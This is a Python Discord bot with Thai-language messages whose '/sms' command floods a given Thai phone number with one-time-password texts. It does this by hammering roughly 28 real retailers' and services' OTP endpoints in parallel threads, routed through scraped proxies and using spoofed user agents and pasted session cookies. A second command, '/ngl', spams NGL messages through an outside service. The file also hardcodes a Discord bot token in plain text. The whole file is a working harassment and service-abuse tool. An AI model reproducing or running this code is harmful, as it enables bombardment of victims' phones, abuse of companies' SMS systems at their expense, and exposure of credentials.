import requests as ru
import threading
import requests
import time
import random
import os
import datetime
import sys
import pystyle
import gratient
import nextcord
from nextcord.ext import commands
from pystyle import Colors, Colorate
from concurrent.futures import ThreadPoolExecutor
import random
from re import search
from requests import Session
from bs4 import BeautifulSoup as bs
from user_agent import generate_user_agent
from requests import Session,post,get
from pystyle import Center, Anime, Colors, Colorate
from colorama import Fore 
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from flask import Flask
from threading import Thread


app = Flask('')

@app.route('/')
def home():
    return "I'm alive!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()


headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
proxy = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text
f = open("proxy.txt", "w")
t = f.write(proxy)
g = open("proxy.txt", "r")
s = g.read().splitlines()

TOKEN = "MTEzMDUyMTUwNjgxMjgwNTE5MA.G7k8qj.vQYQvfI4b5nU79LacE-6gk0CTt9jWah5BLsVfs"
intents = nextcord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

LIMIT = 30

@bot.event
async def on_ready():
    print(f'✅ บอททำงานในชื่อ {bot.user}')



@bot.slash_command(name="sms", description="Spam sms")
async def sms(interaction: nextcord.Interaction, phone: str, amount: int):

    if not phone.isdigit() or len(phone) != 10 or not phone.startswith("0"):
        await interaction.response.send_message("❌ หมายเลขโทรศัพท์ไม่ถูกต้อง! กรุณาใช้รูปแบบ 0999999999", ephemeral=True)
        return
        
    if amount <= 0:
        await interaction.response.send_message("❌ จำนวนครั้งต้องมากกว่า 0!", ephemeral=True)
        return
    if amount > LIMIT:
        await interaction.response.send_message(f"❌ จำนวนครั้งเกินขีดจำกัด! (สูงสุด {LIMIT} ครั้ง)", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)  # แจ้ง Discord ว่ากำลังประมวลผล

    # แจ้งให้ผู้ใช้รู้ว่ากำลังส่ง SMS
    status_message = await interaction.followup.send(f"✅ กำลังส่ง SMS ไปยัง {phone} จำนวน {amount} ครั้ง...")

    try:
        result = SMS(phone, amount)  # ส่ง SMS
        # เมื่อทำงานเสร็จ ให้แก้ไขข้อความ
        print("Attack")
        await status_message.edit(content=f"✅ การส่ง SMS ทั้งหมดเสร็จสิ้น!")
    except Exception as e:
        await status_message.edit(content=f"❌ เกิดข้อผิดพลาด: {e}")
        pass
    

@bot.slash_command(name="help", description="คำสั่งช่วยเหลือ (Help Command)")
async def help(interaction: nextcord.Interaction):
	embed = nextcord.Embed(title="📜 คำสั่งช่วยเหลือ (Help Command)",description="รายการคำสั่งทั้งหมดของบอท",color=nextcord.Color.green())
	embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1324699049504411660/1348446849442512986/file-ViBF9WzkRmMXBmFyyboS1f.webp?ex=67ebd6bd&is=67ea853d&hm=e23f0e8c47edb7b690e05c2370c694733790c3dd94ae9dae154d161c3d61eb47&")
	
	
	embed.add_field(name="🛠️ คำสั่งทั้งหมด", value="`/help` - แสดงคำสั่งทั้งหมด\n`/ping` - เช็คความหน่วงของบอท \n`/sms` - ยิงเบอร์\n/`ngl` - แสปมข้อความngl", inline=False)
	embed.set_footer(text="Berlas")
	
	await interaction.send(embed=embed)
	
@bot.slash_command(name="ping", description="เช็คความหน่วงของบอท")
async def ping(interaction: nextcord.Interaction):
	
    start_time = time.time()
    await interaction.response.defer()
    
    latency = round((time.time() - start_time) * 1000, 2)
    
    bot_latency = round(bot.latency * 1000, 2)
    await interaction.followup.send(f"🏓 Pong!\n"f"⏳ API Latency: {bot_latency} ms\n"f"⌛ Response Time: {latency} ms")
    
@bot.slash_command(name="ngl", description="สแปมข้อความ nglแบบสุ่มข้อความ")
async def ngl(interaction: nextcord.Interaction, user: str, amount: int):
    await interaction.response.defer()

    if amount >= 10:
        await interaction.followup.send("****`⛔` ห้ามใส่จำนวนเกิน10ไอ้ควาย****")
        return

    # ใช้ requests แบบ synchronous
    prs = requests.get(f"https://new-folder-1-qiqvkwwfy-new3214562s-projects.vercel.app/send?username={user}&num={amount}")

    if prs.status_code in {200, 201}:  # ตรวจสอบว่า status code เป็น 200 หรือ 201
        await interaction.followup.send(f"***✅ `การสแปมสำเร็จ` | `{prs.text}`***")
    else:
        await interaction.followup.send(f"**❌ เกิดข้อผิดพลาด: {prs.status_code}**")
		
threading = ThreadPoolExecutor(max_workers=int(100000))

def api1(phone):
	response = requests.post("https://www.aurora.co.th/signin/otp_chk_fast",headers={"Host": "www.aurora.co.th","Connection": "keep-alive","sec-ch-ua-platform": '"Android"',"X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36","Accept": "text/html, */*; q=0.01","sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","sec-ch-ua-mobile": "?1","Origin": "https://www.aurora.co.th","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://www.aurora.co.th/login","Accept-Encoding": "gzip, deflate, br, zstd","Accept-Language": "th-TH,th;q=0.9,en;q=0.8","Cookie": "ci_session_auro=3o1341udg5cs4rhp836i0304v1uur1p0; __lt__cid=61515b24-1eee-4345-b86e-d79b32b92374; __lt__sid=18298072-9b4723f0; _gcl_au=1.1.761421480.1742394646; _tt_enable_cookie=1; _ttp=01JPQD0RTM6MZ5S057CZJQW6M0_.tt.2; _fbp=fb.2.1742394647530.843075054169402391; _ga=GA1.1.527938856.1742394649; G_ENABLED_IDPS=google; _ga_XY8TH7LQ7S=GS1.1.1742394649.1.1.1742394733.36.0.0"},data={"mobile": phone,"type_otp": "7"},proxies={'http': 'http://' + random.choice(s)})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS1|"))
	
def api2(phone):
	requests.post("https://api2.1112.com/api/v1/otp/create",headers={"content-type": "application/json;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"},json={"phonenumber":phone,"language":"th"})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS2|"))
	
def api3(phone):
	requests.post("https://openapi.bigc.co.th/customer/v1/otp", json={"phone_no":f"{phone}"},proxies={'http': 'http://' + random.choice(s)})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS3|"))
	
def api4(phone):
	requests.post("https://www.beauticool.com/?m=request_otp",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type": "application/x-www-form-urlencoded; charset=UTF-8","cookie": "PHPSESSID=rhq2hpsfsr3u3ji2pie67j99u0;_ga=GA1.1.1106451021.1666928426;trustedsite_visit=1;loadapp=true;_ga_PZZ327LRJ2=GS1.1.1666928426.1.1.1666928451.0.0.0","x-requested-with": "XMLHttpRequest"},data=f"tel={phone}",proxies={'http': 'http://' + random.choice(s)})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS4|"))

def api5(phone):
      requests.post("https://www.carsome.co.th/website/login/sendSMS",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "amp_893e6b=w-newQWGaJ9H7YmD5KD1Jg...1g6l3e5ht.1g6l3e5ht.0.0.0;cky-active-check=yes;ajs_anonymous_id=bc6fbe42-9d69-40d9-93db-ba6b777861c1;_gcl_au=1.1.1543614339.1656418159;_ALGOLIA=anonymous-0a2bcc78-8c2b-4051-bfea-97cb347b1e17;__lt__cid=f282ddb1-0630-4c9e-ab88-27f6bd651a35;__lt__sid=530143c9-c9d21696;cookieyesID=R1V5aHU4eWswY21YbjM0NHFGb1FVc1pObDc3U2NSYkk=;moe_uuid=ff0db811-2642-4a84-83a3-7dd26d9c33a1;__cf_bm=4SQWD6XX3mlhMhXrkJ8A1.4MzqJ80OVt9BMJ9NH5uFw-1656418177-0-AdYubBhGil+XHg2/1J8WHy36qRL2urjlZUNUYGwGOkQyg0wlFLvwXAv8ugmj2IdM5ZaTfFxlz/2lRwsTuRRxnrQ=;cky-consent=no;cookieyes-necessary=yes;cookieyes-functional=no;cookieyes-analytics=no;cookieyes-performance=no;cookieyes-advertisement=no;cookieyes-other=no"},json={"username":phone,"optType":0})
      print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS5|"))

def api6(phone):
	requests.post("https://api.freshket.co/baseApi/Users/RequestOtp",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Content-Type": "application/json;charset=UTF-8"},json={"isDev":"false","language":"th","phone":f"+66{phone[1:]}"})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS6|"))

def api7(phone):
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS7|"))

def api8(phone):
	response = requests.post("https://www.aurora.co.th/signin/otp_chk_fast",headers={"Host": "www.aurora.co.th","Connection": "keep-alive","sec-ch-ua-platform": '"Android"',"X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36","Accept": "text/html, */*; q=0.01","sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","sec-ch-ua-mobile": "?1","Origin": "https://www.aurora.co.th","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://www.aurora.co.th/login","Accept-Encoding": "gzip, deflate, br, zstd","Accept-Language": "th-TH,th;q=0.9,en;q=0.8","Cookie": "ci_session_auro=3o1341udg5cs4rhp836i0304v1uur1p0; __lt__cid=61515b24-1eee-4345-b86e-d79b32b92374; __lt__sid=18298072-9b4723f0; _gcl_au=1.1.761421480.1742394646; _tt_enable_cookie=1; _ttp=01JPQD0RTM6MZ5S057CZJQW6M0_.tt.2; _fbp=fb.2.1742394647530.843075054169402391; _ga=GA1.1.527938856.1742394649; G_ENABLED_IDPS=google; _ga_XY8TH7LQ7S=GS1.1.1742394649.1.1.1742394733.36.0.0"},data={"mobile": phone,"type_otp": "7"})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS8|"))
	
def api9(phone):
	requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS9|"))

def api10(phone):
	requests.post("https://service-api.auto1.co.th/w/user/request-otp-on-register",headers={"content-type": "application/json;charset=UTF-8","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"},json={"ConsentFlag":"true","AcceptPolicy":"true","Tel":phone,"OTPId":"","OTP1":"","OTP2":"","OTP3":"","OTP4":"","OTP5":"","OTP6":"","Email":"","Pin1":"","Pin2":"","Pin3":"","Pin4":"","Pin5":"","Pin6":"","PinConfirm1":"","PinConfirm2":"","PinConfirm3":"","PinConfirm4":"","PinConfirm5":"","PinConfirm6":"","FirstName":"","LastName":""},proxies={'http': 'http://' + random.choice(s)})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS10|"))
	
def api11(phone):
	requests.post("https://www.mtsblockchain.com/mgb-api/user/register/reqotp",json={"mobile": phone},headers={"Content-Type":"application/json","Cookie":"_ga=GA1.2.1476569446.1657959172; _gid=GA1.2.587325211.1657959172; _gat_gtag_UA_230676474_1=1; connect.sid=s%3Avu1rVQbmGkMrSzQS7GYQ-y4VHMxHdmH7.zuhlp%2BBtukL2ksityudE9OTqdUH5G3dk3XHm3zNEHIs; cookie_policy_accepted=1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS11|"))
	
def api12(phone):
	requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS12|"))
	
def api13(phone):
	requests.post("https://www.beauticool.com/?m=request_otp",headers={"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type": "application/x-www-form-urlencoded; charset=UTF-8","cookie": "PHPSESSID=rhq2hpsfsr3u3ji2pie67j99u0;_ga=GA1.1.1106451021.1666928426;trustedsite_visit=1;loadapp=true;_ga_PZZ327LRJ2=GS1.1.1666928426.1.1.1666928451.0.0.0","x-requested-with": "XMLHttpRequest"},data=f"tel={phone}",proxies={'http': 'http://' + random.choice(s)})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS13|"))
	
def api14(phone):
	requests.get(f'https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={phone}',headers={"accept": "application/json, text/javascript, */*; q=0.01","x-requested-with": "XMLHttpRequest","user-agent": generate_user_agent(),"cookie": "referer=https%3A%2F%2Fwww.konvy.com%2Fm%2F;PHPSESSID=vnqlo8v638jofnb15arplijj3i;k_privacy_state=true;referer=https%3A%2F%2Fwww.konvy.com%2Fm%2Flogin.php;_gcl_au=1.1.531291202.1661272286;_fbp=fb.1.1661272286002.265391910;_gid=GA1.2.960487052.1661272286;_gat_UA-28072727-2=1;_tt_enable_cookie=1;_ttp=d640ab77-0c19-4578-855d-4fb1ceda3f0a;f34c_new_user_view_count=%7B%22count%22%3A2%2C%22expire_time%22%3A1661358684%7D;_ga_Z9S47GV47R=GS1.1.1661272286.1.1.1661272293.53.0.0;_ga=GA1.2.1347355119.1661272286"})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS14|"))
	
def api15(phone):
	requests.post("https://api.kaidee.com/0.20/member/generate_otp",headers={"user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36"},json={"mobile":phone,"otp_type":1})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS15|"))
	
def api16(phone):
	requests.post("https://gamingnation.dtac.co.th/api/otp/request",headers={"User-Agent": generate_user_agent(),"Cookie": "auth.strategy=local; i18n_redirected=th; _gcl_au=1.1.265124296.1661273714; _ga=GA1.3.1857579863.1661273717; _gid=GA1.3.1514915490.1661273717; _fbp=fb.2.1661273718125.787639535; _tt_enable_cookie=1; _ttp=7e4a2162-1ab4-41a0-8b77-e1188cda6a3a; _hjSessionUser_2510409=eyJpZCI6ImVkM2I0OWU2LTBjODQtNWU1ZC04OWIzLTZlMjk5NGFhMWE3NCIsImNyZWF0ZWQiOjE2NjEyNzM3MTc5MzcsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_2510409=eyJpZCI6IjA4YjEyYTNlLTExNjgtNDNlMS05NTVmLWMyMWY2OTU5MGFiYyIsImNyZWF0ZWQiOjE2NjEyNzM3MTgzMTksImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _gat_UA-16732483-1=1"},json={"template":"register","phone_no":phone})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS16|"))
	
def api17(phone):
	requests.post("https://api-sso.ch3plus.com/user/request-otp",headers={'user-agent': generate_user_agent()},json={"tel":phone,"type":"login"})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS17|"))
	
def api18(phone):
	requests.post("https://api.cmtrade.com/api/v2/account/sms/code",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","cookie": "utm_source=GoogleSEM3; _ga=GA1.2.217747635.1664304861; _gac_UA-204031796-1=1.1664304861.EAIaIQobChMIkIuq29K1-gIVwRErCh1xrgqNEAAYAiAAEgLxKPD_BwE; _gid=GA1.2.2032034977.1664304861; _gat_gtag_UA_204031796_1=1; _gac_UA-204031796-2=1.1664304861.EAIaIQobChMIkIuq29K1-gIVwRErCh1xrgqNEAAYAiAAEgLxKPD_BwE; _gat_gtag_UA_204031796_2=1; _ga_39RBNN0V78=GS1.1.1664304861.1.0.1664304862.0.0.00","content-type": "application/x-www-form-urlencoded; charset=UTF-8","accept": "application/json, text/javascript, */*; q=0.01"},data=f"phone={phone}&countryCode=66&countryId=Thailand&type=mobile")
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS18|"))
	
def api19(phone):
	requests.post("https://trainflix-api.xeersoft.co.th/api/otpphone/register",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Accept": "application/json, text/plain, */*","Content-Type": "application/json"},json={"numberphone": phone})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS19|"))
	
def api20(phone):
	requests.post("https://api.fairdee.co.th/profile/request-otp",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","cookie": "mp_184c9deb723214f5772e9320157cb5b9_mixpanel=%7B%22distinct_id%22%3A%20%22183bbb5007ddf-0261f79d6d1bad-5771031-1fa400-183bbb5007e6f9%22%2C%22%24device_id%22%3A%20%22183bbb5007ddf-0261f79d6d1bad-5771031-1fa400-183bbb5007e6f9%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D; WZRK_G=a566c075343f4d118e2b0f35111f6f22; WZRK_S_69W-676-R46Z=%7B%22p%22%3A1%2C%22s%22%3A1665301546%2C%22t%22%3A1665301545%7D; _ga=GA1.3.837932271.1665301552; _gid=GA1.3.1240970639.1665301552; _gat=1; _gcl_au=1.1.1486581940.1665301553; _gat_gtag_UA_116460668_3=1; ajs_anonymous_id=578a9b90-fec5-409e-9b9e-60461e79d2a8; _fbp=fb.2.1665301553007.478015998","accept": "application/json, text/plain, */*"},json={"username":phone,"username_type":"phone","intent":"signup","is_email_otp":'false'})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS20|"))
	
def api21(phone):
	requests.get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=0{phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2")
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS21|"))

def api22(phone):
	requests.post("https://www.mtsblockchain.com/mgb-api/user/register/reqotp",json={"mobile": phone},headers={"Content-Type":"application/json","Cookie":"_ga=GA1.2.1476569446.1657959172; _gid=GA1.2.587325211.1657959172; _gat_gtag_UA_230676474_1=1; connect.sid=s%3Avu1rVQbmGkMrSzQS7GYQ-y4VHMxHdmH7.zuhlp%2BBtukL2ksityudE9OTqdUH5G3dk3XHm3zNEHIs; cookie_policy_accepted=1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS22|"))

def api23(phone):
	requests.post("https://www.kaitorasap.co.th/api/index.php/send-otp-login/",headers={"Accept": "application/json, text/javascript, */*; q=0.01","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Cookie": "PHPSESSID=080ugg4928ulkhj6kaggiqkvd1; _ga=GA1.3.1856390916.1657557339; _gid=GA1.3.1103002458.1657557339; _gat_gtag_UA_141105037_1=1; G_ENABLED_IDPS=google"},data=f"phone_number={phone}&lag=")
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS23|"))
	
def api24(phone):
	requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS24|"))

def api25(phone):
	requests.post("https://api-sso.ch3plus.com/user/request-otp",headers={'user-agent': generate_user_agent()},json={"tel":phone,"type":"login"})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS25|"))
	
def api26(phone):
	requests.post("https://chobrod.com/register",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","x-requested-with": "XMLHttpRequest","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","cookie": ".AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8AbF96Heci1NnsIpfhXCcZq_1dcnjr3wJH7IbyuvXx7JO98q0olmE5QQ09sRX3ts4f0snXBgp8hKG68ehlSJxRKG2BLY2Wj9z-AV6rmiU8RDNlEhHozm-R_ZGKSEbQSycbX455ffFuyBSw7fAUE-9M8; CHOBROD_SERVERID=051_30886; referrerCheckingGA=https://www.google.com/; _ga=GA1.2.684081299.1664700698; _gid=GA1.2.1610639645.1664700698; _gat_UA-88971742-1=1; sidchobrod=m08SOd7CyVuruAdw6iJ6fiZ9Sdm1V90G; usidchobrod=EENsATLoK7OnvSeYvnOuhOEJfl2zllCK; G_ENABLED_IDPS=google; _fbp=fb.1.1664700699743.423276722; GuildId=615af95c-99ca-48ba-bf8c-39a6638a708e; _ga_D11BPJ59QV=GS1.1.1664700697.1.1.1664700735.0.0.0"},data=f"ReturnUrl=%2F&UserName={phone}&Displayname=asssdad+sadass&CityId=1&&Captcha=F9UR")
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS26|"))
	
def api27(phone):
	requests.post("https://api-sso.ch3plus.com/user/request-otp",json={"tel": f"{phone}","type": "login"})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS27|"))

def api28(phone):
	requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}")
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|SMS28|"))
     
def call1(phone):
	requests.post("https://lb-api.fox83-sy.xyz/api/otp/register",data={"applicant":phone,"serviceName":"fox888.com"},proxies={'http': 'http://' + random.choice(s)})
	print (Colorate.Horizontal(Colors.yellow_to_green,"SEND|CALL|"))
    

threading = ThreadPoolExecutor(max_workers=int(100000000))

def SMS(phone, amount):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        for _ in range(amount):
            executor.submit(api1, phone)
            executor.submit(api2, phone)
            executor.submit(api3, phone)
            executor.submit(api4, phone)
            executor.submit(api5, phone)
            executor.submit(api6, phone)
            executor.submit(api7, phone)
            executor.submit(api8, phone)
            executor.submit(api9, phone)
            executor.submit(api10, phone)
            executor.submit(api11, phone)
            executor.submit(api12, phone)
            executor.submit(api13, phone)
            executor.submit(api14, phone)
            executor.submit(api15, phone)
            executor.submit(api16, phone)
            executor.submit(api17, phone)
            executor.submit(api18, phone)
            executor.submit(api19, phone)
            executor.submit(api20, phone)
            executor.submit(api21, phone)
            executor.submit(api22, phone)
            executor.submit(api23, phone)
            executor.submit(api24, phone)
            executor.submit(api25, phone)
            executor.submit(api26, phone)
            executor.submit(api27, phone)
            executor.submit(api28, phone)
            executor.submit(call1, phone)
            
            for i in range(309):
                executor.submit(api1, phone)
                executor.submit(api15, phone)
                executor.submit(api25, phone)


bot.run(TOKEN)
keep_alive()
